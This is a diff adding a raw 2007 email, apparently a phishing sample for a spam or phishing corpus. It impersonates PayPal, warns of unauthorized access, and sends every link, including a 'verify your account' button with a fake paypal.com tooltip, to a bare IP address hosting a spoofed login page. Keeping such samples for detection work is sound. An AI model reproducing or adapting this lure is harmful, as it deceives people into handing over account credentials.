@@ -1,0 +1,56 @@
+From nobody Sun Jan 25 13:50:02 2015
+Return-Path: <root@OgallalaKCNserver.local>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.4.9])
+ by example.com (Postfix) with ESMTP id C2C1F4696E
+ for <user@login.example.com>; Sun, 11 Mar 2007 20:24:12 -0400 (EDT)
+Received: from OgallalaKCNserver.local
+ (71-8-237-114.static.krny.ne.charter.com [71.8.237.114])
+ by mail.example.org (Postfix) with ESMTP id 9DDB5131FC65
+ for <user@example.com>; Sun, 11 Mar 2007 20:24:12 -0400 (EDT)
+Received: by OgallalaKCNserver.local (Postfix, from userid 0)
+ id 442FB7379A25; Sun, 11 Mar 2007 11:39:41 -0700 (MST)
+To: user@example.com
+Subject: Unauthorized access to your PayPal account!
+From: PayPal <service@email-paypal.com>
+Content-Type: text/html
+Message-Id: <20070311183941.442FB7379A25@OgallalaKCNserver.local>
+Date: Sun, 11 Mar 2007 11:39:41 -0700 (MST)
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 958
+
+
+<html><head><title>PayPal</title></head>
+<body>
+<style type="text/css">
+BODY, TD {font-family: verdana,arial,helvetica,sans-serif;font-size: 12px;color: #000000;}
+HR.dotted {width: 100%; margin-top: 0px; margin-bottom: 0px; border-left: #fff; border-right: #fff; border-top: #fff; border-bottom: 2px dotted #ccc;}
+.sansSerif{font-family: verdana,arial,helvetica,sans-serif; font-size: 14px;color: #000000;}
+.heading {font-family: verdana,arial,helvetica,sans-serif;font-size: 18px;font-weight: bold;color: #003366;}
+.xptFooter {font-family: verdana,arial,helvetica,sans-serif;font-size: 11px;color: #aaaaaa;}
+</style>
+<table align="center" border="0" cellpadding="0" cellspacing="0" width="600"><tr valign="top"><td><a href="http://59.108.33.90/new.paypal.com/index.html"><img src="http://images.paypal.com/en_US/i/logo/email_logo.gif" border="0" alt="PayPal"/></a></td></tr></table>
+<table align="center" border="0" cellpadding="0" cellspacing="0" width="100%"><tr><td background="http://images.paypal.com/en_US/i/scr/bg_clk.gif" width="100%"><img alt="" border="0" height="29" src="http://images.paypal.com/en_US/i/scr/pixel.gif" width="1"/></td></tr><tr><td><img alt="" border="0" height="10" src="http://images.paypal.com/en_US/i/scr/pixel.gif" width="1"/></td></tr></table>
+<table align="center" border="0" cellpadding="0" cellspacing="0" width="600"><tr><td width="100%" valign="top">
+<span class="heading">Unauthorized access to your PayPal account!<br/><br/></span>
+<p>We recently noticed more attempts to log in to your <span class="emphasis">PayPal account</span> from a foreign IP address.</p>
+<p>If you accessed your account while traveling, the unusual log in attempts may have been initiated by you.
+However, if you are the rightfull holder of the account, please visit Paypal as soon as possible to verify your identity:</p>
+	<table align="left" bgcolor="#FFE65C" border="0" cellpadding="1" cellspacing="0" width="600"><tr><td>
+		<table align="center" bgcolor="#FFFECD" border="0" cellpadding="4" cellspacing="0" width="100%"><tr><td align="center" class="sansSerif">
+<a href="http://59.108.33.90/new.paypal.com/index.html" title="https://paypal.com/us/secure_verify?ID=pp468">
+Click here to verify your account</a></td></tr></table></td></tr>
+	</table><br><br><br><br>
+	
+	<p>We ask that you allow at least 72 hours for the case to be investigated and we strongly recommend to verify your account in that time.
+<br/><br/>Thank you for using PayPal!<br><br>The PayPal Team<br><br></p>
+<hr class="dotted"/>
+<p class="xptFooter">Please do not reply to this email. This mailbox is not monitored and you will not receive a response. For assistance, 
+<a href="http://59.108.33.90/new.paypal.com/index.html">log in</a> to your PayPal account and choose the Help link located in the top right corner of any PayPal page.<br/><br class="h10"/>To receive email notifications in plain text instead of HTML, update your preferences 
+<a href="http://59.108.33.90/new.paypal.com/index.html">here</a>.</p><span class="xptFooter"/><br/><span class="xptFooter">PayPal Email ID PP468</span></td></tr>
+</table>
+</body>
+</html>
